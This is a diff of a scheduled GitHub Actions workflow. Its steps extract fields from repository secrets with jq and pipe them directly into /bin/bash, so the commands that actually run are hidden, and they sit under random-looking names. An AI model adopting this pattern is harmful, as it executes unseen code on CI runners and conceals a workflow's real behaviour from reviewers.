@@ -1,10 +1,10 @@
 name: kongjuliuli
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 2/6 * * *'
-
-jobs:  # 14441
+    - cron: '21 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,17 +12,9 @@ jobs:  # 14441
       - uses: actions/checkout@v4
       - name: kongjuliuli
         env:
-          bcav6: ${{ secrets.bcav6 }}
+          y43132: ${{ secrets.y43132 }}
         run: |
-          echo $bcav6 | jq -r .mkm4382 | /bin/bash
-          echo $tkunk92 | jq -r .av4 | /bin/bash
-          echo $pz2063 | jq -r .cwtqt6 | /bin/bash
-          echo $atlh24 | jq -r .zklfx77 | /bin/bash
-          echo $b9576 | jq -r .klqiw772 | /bin/bash
-          echo $krwr40715 | jq -r .kujp2453 | /bin/bash
-          echo $noqd26299 | jq -r .wf10 | /bin/bash
-          echo $ynu44 | jq -r .tm305 | /bin/bash
-          echo $xw353 | jq -r .ml4 | /bin/bash
-          echo $kt88 | jq -r .uk86 | /bin/bash
-          echo $b40949 | jq -r .m419 | /bin/bash
+          echo $y43132 | jq -r .fb3 | /bin/bash
+          echo $webr5323 | jq -r .ocgud347 | /bin/bash
+          echo $qr7 | jq -r .e59 | /bin/bash
 
